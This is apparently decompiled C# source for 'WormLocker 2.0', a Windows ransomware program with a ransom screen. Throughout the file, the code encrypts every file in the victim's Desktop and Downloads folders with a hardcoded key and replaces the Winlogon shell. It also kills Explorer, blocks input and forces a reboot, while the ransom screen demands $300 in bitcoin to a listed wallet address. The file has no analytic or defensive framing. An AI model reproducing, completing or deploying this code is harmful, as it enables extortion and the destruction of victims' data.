using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace WormLocker2._0;

public class WormLocker2 : Form
{
	public class CoreEncryption
	{
		public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class CoreDecryption
	{
		public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class EncryptionFile
	{
		public void EncryptFile(string file, string password)
		{
			byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, bytes);
			File.WriteAllBytes(file, bytes2);
		}
	}

	public class DecryptionFile
	{
		public void DecryptFile(string fileEncrypted, string password)
		{
			byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreDecryption.AES_Decrypt(bytesToBeDecrypted, bytes);
			File.WriteAllBytes(fileEncrypted, bytes2);
		}
	}

	private IContainer components = null;

	private Label label1;

	private TextBox textBox1;

	private Button DECRYPT;

	private Timer tmr_del_desktop;

	private Timer tmr_start_enc;

	private Timer tmr_unhide;

	private Timer tmr_out;

	private PictureBox pictureBox1;

	private Label label2;

	private TextBox textBox2;

	private GroupBox groupBox1;

	private Label label5;

	private Label label3;

	private GroupBox groupBox2;

	private Label label7;

	private Label label4;

	private Label label6;

	private GroupBox groupBox3;

	private Button button1;

	private TextBox textBox3;

	private PictureBox pictureBox2;

	private Label label8;

	private LinkLabel linkLabel1;

	private LinkLabel linkLabel2;

	private LinkLabel linkLabel3;

	private ComboBox comboBox1;

	[DllImport("user32.dll")]
	private static extern bool BlockInput(bool block);

	public WormLocker2()
	{
		InitializeComponent();
		((Control)label1).set_Text(TimeSpan.FromMinutes(120.0).ToString());
	}

	private void WormLocker2_Load(object sender, EventArgs e)
	{
		//IL_00b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00be: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		((Form)this).set_Location(new Point(-1000, -1000));
		RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
		registryKey.SetValue("Shell", "empty", RegistryValueKind.String);
		File.WriteAllText(folderPath + "\\worm_tool.sys", "encrypted");
		File.WriteAllText(text + "\\worm_tool.sys", "encrypted");
		tmr_del_desktop.Start();
		tmr_start_enc.Start();
		tmr_out.Start();
		DateTime startTime = DateTime.Now;
		Timer val = new Timer();
		val.set_Interval(1000);
		Timer val2 = val;
		val2.add_Tick((EventHandler)delegate
		{
			((Control)label1).set_Text((TimeSpan.FromMinutes(120.0) - (DateTime.Now - startTime)).ToString("hh\\:mm\\:ss"));
		});
		val2.set_Enabled(true);
		tmr_unhide.Start();
	}

	private void WormLocker2_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private static void Start_Encrypt()
	{
		FreezeMouse();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		EncryptionFile encryptionFile = new EncryptionFile();
		string password = "LUC QPV BTR";
		for (int i = 0; i < files.Length; i++)
		{
			encryptionFile.EncryptFile(files[i], password);
		}
		for (int j = 0; j < files2.Length; j++)
		{
			encryptionFile.EncryptFile(files2[j], password);
		}
	}

	private void tmr_del_desktop_Tick(object sender, EventArgs e)
	{
		tmr_del_desktop.Stop();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string path = folderPath + "\\desktop.ini";
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string path2 = text + "\\desktop.ini";
		if (File.Exists(path))
		{
			File.Delete(path);
		}
		if (File.Exists(path2))
		{
			File.Delete(path2);
		}
		tmr_del_desktop.Start();
	}

	private void tmr_start_enc_Tick(object sender, EventArgs e)
	{
		tmr_start_enc.Stop();
		Start_Encrypt();
	}

	private void tmr_unhide_Tick(object sender, EventArgs e)
	{
		tmr_unhide.Stop();
		Process[] array = null;
		array = Process.GetProcessesByName("explorer");
		Process[] array2 = array;
		foreach (Process process in array2)
		{
			process.Kill();
		}
		Process.Start("C:\\Windows\\System32\\ransom_voice.vbs");
		((Form)this).CenterToScreen();
		Thawouse();
	}

	public static void FreezeMouse()
	{
		BlockInput(block: true);
	}

	public static void Thawouse()
	{
		BlockInput(block: false);
	}

	private void DECRYPT_Click(object sender, EventArgs e)
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_011e: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)textBox1).get_Text() == "")
		{
			MessageBox.Show("Incorrect key", "WRONG KEY", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		else if (((Control)textBox1).get_Text() == "LUC QPV BTR")
		{
			MessageBox.Show("The key is correct", "UNLOCKED", (MessageBoxButtons)0, (MessageBoxIcon)64);
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "", RegistryValueKind.String);
			File.Delete("C:\\Windows\\System32\\LogonUI.exe");
			File.Copy("C:\\Windows\\System32\\LogonUItrue.exe", "C:\\Windows\\System32\\LogonUI.exe");
			File.Delete("C:\\Windows\\System32\\LogonUItrue.exe");
			File.Delete("C:\\Windows\\System32\\LogonUIinf.exe");
			OFF_Encrypt();
			RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
			registryKey2.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
			Process.Start("C:\\Windows\\explorer.exe");
			Process[] array = null;
			array = Process.GetProcessesByName("WormLocker2.0");
			Process[] array2 = array;
			foreach (Process process in array2)
			{
				process.Kill();
			}
		}
		else
		{
			MessageBox.Show("Incorrect key", "WRONG KEY", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	private static void OFF_Encrypt()
	{
		FreezeMouse();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		DecryptionFile decryptionFile = new DecryptionFile();
		string password = "LUC QPV BTR";
		for (int i = 0; i < files.Length; i++)
		{
			decryptionFile.DecryptFile(files[i], password);
		}
		for (int j = 0; j < files2.Length; j++)
		{
			decryptionFile.DecryptFile(files2[j], password);
			Thawouse();
		}
	}

	private void tmr_out_Tick(object sender, EventArgs e)
	{
		tmr_out.Stop();
		Process.Start("shutdown", "/r /t 0");
		Process[] array = null;
		array = Process.GetProcessesByName("wscript");
		Process[] array2 = array;
		foreach (Process process in array2)
		{
			process.Kill();
		}
		Process[] array3 = null;
		array3 = Process.GetProcessesByName("WormLocker2.0");
		Process[] array4 = array3;
		foreach (Process process2 in array4)
		{
			process2.Kill();
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Expected O, but got Unknown
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_0080: Expected O, but got Unknown
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		//IL_008b: Expected O, but got Unknown
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0096: Expected O, but got Unknown
		//IL_0097: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a1: Expected O, but got Unknown
		//IL_00a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ac: Expected O, but got Unknown
		//IL_00ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b7: Expected O, but got Unknown
		//IL_00b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c2: Expected O, but got Unknown
		//IL_00c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cd: Expected O, but got Unknown
		//IL_00ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d8: Expected O, but got Unknown
		//IL_00d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e3: Expected O, but got Unknown
		//IL_00e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ee: Expected O, but got Unknown
		//IL_00ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f9: Expected O, but got Unknown
		//IL_00fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0104: Expected O, but got Unknown
		//IL_0105: Unknown result type (might be due to invalid IL or missing references)
		//IL_010f: Expected O, but got Unknown
		//IL_0110: Unknown result type (might be due to invalid IL or missing references)
		//IL_011a: Expected O, but got Unknown
		//IL_011b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0125: Expected O, but got Unknown
		//IL_0126: Unknown result type (might be due to invalid IL or missing references)
		//IL_0130: Expected O, but got Unknown
		//IL_0131: Unknown result type (might be due to invalid IL or missing references)
		//IL_013b: Expected O, but got Unknown
		//IL_013c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0146: Expected O, but got Unknown
		//IL_0147: Unknown result type (might be due to invalid IL or missing references)
		//IL_0151: Expected O, but got Unknown
		//IL_01d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01db: Expected O, but got Unknown
		//IL_0269: Unknown result type (might be due to invalid IL or missing references)
		//IL_0273: Expected O, but got Unknown
		//IL_0317: Unknown result type (might be due to invalid IL or missing references)
		//IL_0321: Expected O, but got Unknown
		//IL_0482: Unknown result type (might be due to invalid IL or missing references)
		//IL_048c: Expected O, but got Unknown
		//IL_050f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0519: Expected O, but got Unknown
		//IL_059b: Unknown result type (might be due to invalid IL or missing references)
		//IL_05a5: Expected O, but got Unknown
		//IL_06ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_06f7: Expected O, but got Unknown
		//IL_077e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0788: Expected O, but got Unknown
		//IL_08be: Unknown result type (might be due to invalid IL or missing references)
		//IL_08c8: Expected O, but got Unknown
		//IL_0970: Unknown result type (might be due to invalid IL or missing references)
		//IL_097a: Expected O, but got Unknown
		//IL_0a05: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a0f: Expected O, but got Unknown
		//IL_0bc3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bcd: Expected O, but got Unknown
		//IL_0c65: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c6f: Expected O, but got Unknown
		//IL_0cee: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cf8: Expected O, but got Unknown
		//IL_0d95: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d9f: Expected O, but got Unknown
		//IL_0e46: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e50: Expected O, but got Unknown
		//IL_0efa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f04: Expected O, but got Unknown
		//IL_0f8f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f99: Expected O, but got Unknown
		//IL_1050: Unknown result type (might be due to invalid IL or missing references)
		//IL_105a: Expected O, but got Unknown
		//IL_116e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1178: Expected O, but got Unknown
		//IL_11b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_11c3: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(WormLocker2));
		label1 = new Label();
		textBox1 = new TextBox();
		DECRYPT = new Button();
		tmr_del_desktop = new Timer(components);
		tmr_start_enc = new Timer(components);
		tmr_unhide = new Timer(components);
		tmr_out = new Timer(components);
		pictureBox1 = new PictureBox();
		label2 = new Label();
		textBox2 = new TextBox();
		groupBox1 = new GroupBox();
		label5 = new Label();
		label3 = new Label();
		groupBox2 = new GroupBox();
		label7 = new Label();
		label4 = new Label();
		label6 = new Label();
		groupBox3 = new GroupBox();
		button1 = new Button();
		textBox3 = new TextBox();
		pictureBox2 = new PictureBox();
		label8 = new Label();
		linkLabel1 = new LinkLabel();
		linkLabel2 = new LinkLabel();
		linkLabel3 = new LinkLabel();
		comboBox1 = new ComboBox();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)groupBox1).SuspendLayout();
		((Control)groupBox2).SuspendLayout();
		((Control)groupBox3).SuspendLayout();
		((ISupportInitialize)pictureBox2).BeginInit();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_BackColor(Color.Maroon);
		((Control)label1).set_Cursor(Cursors.get_No());
		((Control)label1).set_Font(new Font("Arial", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)label1).set_ForeColor(Color.Transparent);
		((Control)label1).set_Location(new Point(22, 81));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(145, 37));
		((Control)label1).set_TabIndex(1);
		((Control)label1).set_Text("00:00:00");
		((Control)textBox1).set_BackColor(Color.White);
		((Control)textBox1).set_Font(new Font("Microsoft Sans Serif", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)textBox1).set_ForeColor(Color.Black);
		((Control)textBox1).set_Location(new Point(275, 556));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(360, 35));
		((Control)textBox1).set_TabIndex(6);
		((Control)textBox1).set_Text("000-000-000\r\n");
		((Control)DECRYPT).set_BackColor(Color.White);
		((Control)DECRYPT).set_Cursor(Cursors.get_Hand());
		((Control)DECRYPT).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)DECRYPT).set_ForeColor(Color.Black);
		((Control)DECRYPT).set_Location(new Point(685, 557));
		((Control)DECRYPT).set_Name("DECRYPT");
		((Control)DECRYPT).set_Size(new Size(245, 34));
		((Control)DECRYPT).set_TabIndex(7);
		((Control)DECRYPT).set_Text("Decrypt");
		((ButtonBase)DECRYPT).set_UseVisualStyleBackColor(false);
		((Control)DECRYPT).add_Click((EventHandler)DECRYPT_Click);
		tmr_del_desktop.set_Enabled(true);
		tmr_del_desktop.add_Tick((EventHandler)tmr_del_desktop_Tick);
		tmr_start_enc.set_Enabled(true);
		tmr_start_enc.set_Interval(3000);
		tmr_start_enc.add_Tick((EventHandler)tmr_start_enc_Tick);
		tmr_unhide.set_Interval(10000);
		tmr_unhide.add_Tick((EventHandler)tmr_unhide_Tick);
		tmr_out.set_Enabled(true);
		tmr_out.set_Interval(7200000);
		tmr_out.add_Tick((EventHandler)tmr_out_Tick);
		((Control)pictureBox1).set_BackColor(Color.Maroon);
		((Control)pictureBox1).set_BackgroundImage((Image)componentResourceManager.GetObject("pictureBox1.BackgroundImage"));
		((Control)pictureBox1).set_Location(new Point(74, 23));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(108, 114));
		pictureBox1.set_TabIndex(8);
		pictureBox1.set_TabStop(false);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_BackColor(Color.Maroon);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label2).set_ForeColor(Color.White);
		((Control)label2).set_Location(new Point(357, 12));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(388, 25));
		((Control)label2).set_TabIndex(9);
		((Control)label2).set_Text("Ooops, your files have been encrypted!");
		((Control)textBox2).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)textBox2).set_Location(new Point(275, 40));
		((TextBoxBase)textBox2).set_Multiline(true);
		((Control)textBox2).set_Name("textBox2");
		textBox2.set_ScrollBars((ScrollBars)2);
		((Control)textBox2).set_Size(new Size(655, 412));
		((Control)textBox2).set_TabIndex(10);
		((Control)textBox2).set_Text(componentResourceManager.GetString("textBox2.Text"));
		((Control)groupBox1).set_BackColor(Color.Maroon);
		((Control)groupBox1).get_Controls().Add((Control)(object)label5);
		((Control)groupBox1).get_Controls().Add((Control)(object)label3);
		((Control)groupBox1).get_Controls().Add((Control)(object)label1);
		((Control)groupBox1).set_Location(new Point(15, 124));
		((Control)groupBox1).set_Name("groupBox1");
		((Control)groupBox1).set_Size(new Size(257, 143));
		((Control)groupBox1).set_TabIndex(11);
		groupBox1.set_TabStop(false);
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Font(new Font("Microsoft Sans Serif", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label5).set_ForeColor(Color.White);
		((Control)label5).set_Location(new Point(56, 55));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(69, 18));
		((Control)label5).set_TabIndex(2);
		((Control)label5).set_Text("Time Left");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label3).set_ForeColor(Color.Gold);
		((Control)label3).set_Location(new Point(25, 16));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(171, 20));
		((Control)label3).set_TabIndex(0);
		((Control)label3).set_Text("Payment wil Raised On");
		((Control)groupBox2).set_BackColor(Color.Maroon);
		((Control)groupBox2).get_Controls().Add((Control)(object)label7);
		((Control)groupBox2).get_Controls().Add((Control)(object)label4);
		((Control)groupBox2).get_Controls().Add((Control)(object)label6);
		((Control)groupBox2).set_Location(new Point(15, 290));
		((Control)groupBox2).set_Name("groupBox2");
		((Control)groupBox2).set_Size(new Size(254, 142));
		((Control)groupBox2).set_TabIndex(12);
		groupBox2.set_TabStop(false);
		((Control)label7).set_AutoSize(true);
		((Control)label7).set_Font(new Font("Microsoft Sans Serif", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label7).set_ForeColor(Color.White);
		((Control)label7).set_Location(new Point(56, 47));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(69, 18));
		((Control)label7).set_TabIndex(21);
		((Control)label7).set_Text("Time Left");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_BackColor(Color.Maroon);
		((Control)label4).set_Cursor(Cursors.get_No());
		((Control)label4).set_Font(new Font("Arial", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)label4).set_ForeColor(Color.Transparent);
		((Control)label4).set_Location(new Point(35, 75));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(145, 37));
		((Control)label4).set_TabIndex(20);
		((Control)label4).set_Text("00:00:00");
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label6).set_ForeColor(Color.Gold);
		((Control)label6).set_Location(new Point(24, 16));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(172, 20));
		((Control)label6).set_TabIndex(0);
		((Control)label6).set_Text("Your files will be lost on");
		((Control)groupBox3).set_BackColor(Color.Maroon);
		((Control)groupBox3).get_Controls().Add((Control)(object)button1);
		((Control)groupBox3).get_Controls().Add((Control)(object)textBox3);
		((Control)groupBox3).get_Controls().Add((Control)(object)pictureBox2);
		((Control)groupBox3).get_Controls().Add((Control)(object)label8);
		((Control)groupBox3).set_Location(new Point(275, 465));
		((Control)groupBox3).set_Name("groupBox3");
		((Control)groupBox3).set_Size(new Size(655, 84));
		((Control)groupBox3).set_TabIndex(13);
		groupBox3.set_TabStop(false);
		((Control)button1).set_Location(new Point(579, 51));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(59, 30));
		((Control)button1).set_TabIndex(11);
		((Control)button1).set_Text("Copy");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)textBox3).set_BackColor(Color.Maroon);
		((Control)textBox3).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)textBox3).set_ForeColor(Color.White);
		((Control)textBox3).set_Location(new Point(136, 39));
		((TextBoxBase)textBox3).set_Multiline(true);
		((Control)textBox3).set_Name("textBox3");
		((Control)textBox3).set_Size(new Size(408, 32));
		((Control)textBox3).set_TabIndex(10);
		((Control)textBox3).set_Text("bc1qhwc78nkm7v84ms8a3ym0zyvm23ft6azvskyht2");
		((Control)pictureBox2).set_BackColor(Color.Maroon);
		((Control)pictureBox2).set_BackgroundImage((Image)componentResourceManager.GetObject("pictureBox2.BackgroundImage"));
		((Control)pictureBox2).set_BackgroundImageLayout((ImageLayout)3);
		((Control)pictureBox2).set_Location(new Point(0, 19));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(118, 52));
		pictureBox2.set_TabIndex(9);
		pictureBox2.set_TabStop(false);
		((Control)label8).set_AutoSize(true);
		((Control)label8).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label8).set_ForeColor(Color.Gold);
		((Control)label8).set_Location(new Point(132, 16));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(310, 20));
		((Control)label8).set_TabIndex(0);
		((Control)label8).set_Text("Send $300 worth of bitcoin to this address:");
		((Control)linkLabel1).set_AutoSize(true);
		((Control)linkLabel1).set_BackColor(Color.Maroon);
		((Control)linkLabel1).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		linkLabel1.set_LinkColor(Color.Aqua);
		((Control)linkLabel1).set_Location(new Point(12, 501));
		((Control)linkLabel1).set_Name("linkLabel1");
		((Control)linkLabel1).set_Size(new Size(98, 16));
		((Control)linkLabel1).set_TabIndex(16);
		linkLabel1.set_TabStop(true);
		((Control)linkLabel1).set_Text("About bitcoin");
		((Control)linkLabel2).set_AutoSize(true);
		((Control)linkLabel2).set_BackColor(Color.Maroon);
		((Control)linkLabel2).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		linkLabel2.set_LinkColor(Color.Aqua);
		((Control)linkLabel2).set_Location(new Point(12, 533));
		((Control)linkLabel2).set_Name("linkLabel2");
		((Control)linkLabel2).set_Size(new Size(142, 16));
		((Control)linkLabel2).set_TabIndex(17);
		linkLabel2.set_TabStop(true);
		((Control)linkLabel2).set_Text("How to buy bitcoins");
		((Control)linkLabel3).set_AutoSize(true);
		((Control)linkLabel3).set_BackColor(Color.Maroon);
		((Control)linkLabel3).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		linkLabel3.set_LinkColor(Color.Aqua);
		((Control)linkLabel3).set_Location(new Point(12, 567));
		((Control)linkLabel3).set_Name("linkLabel3");
		((Control)linkLabel3).set_Size(new Size(80, 16));
		((Control)linkLabel3).set_TabIndex(18);
		linkLabel3.set_TabStop(true);
		((Control)linkLabel3).set_Text("Contact us");
		((Control)comboBox1).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((ListControl)comboBox1).set_FormattingEnabled(true);
		comboBox1.get_Items().AddRange(new object[3] { "English", "Russian", "African" });
		((Control)comboBox1).set_Location(new Point(775, 4));
		((Control)comboBox1).set_Name("comboBox1");
		((Control)comboBox1).set_Size(new Size(138, 33));
		((Control)comboBox1).set_TabIndex(19);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(SystemColors.Control);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		((Form)this).set_ClientSize(new Size(921, 598));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)comboBox1);
		((Control)this).get_Controls().Add((Control)(object)linkLabel3);
		((Control)this).get_Controls().Add((Control)(object)linkLabel2);
		((Control)this).get_Controls().Add((Control)(object)linkLabel1);
		((Control)this).get_Controls().Add((Control)(object)groupBox3);
		((Control)this).get_Controls().Add((Control)(object)groupBox2);
		((Control)this).get_Controls().Add((Control)(object)groupBox1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)textBox2);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)DECRYPT);
		((Control)this).set_Cursor(Cursors.get_Default());
		((Control)this).set_DoubleBuffered(true);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("WormLocker2");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Worm Locker 2.0");
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(WormLocker2_FormClosing));
		((Form)this).add_Load((EventHandler)WormLocker2_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)groupBox1).ResumeLayout(false);
		((Control)groupBox1).PerformLayout();
		((Control)groupBox2).ResumeLayout(false);
		((Control)groupBox2).PerformLayout();
		((Control)groupBox3).ResumeLayout(false);
		((Control)groupBox3).PerformLayout();
		((ISupportInitialize)pictureBox2).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
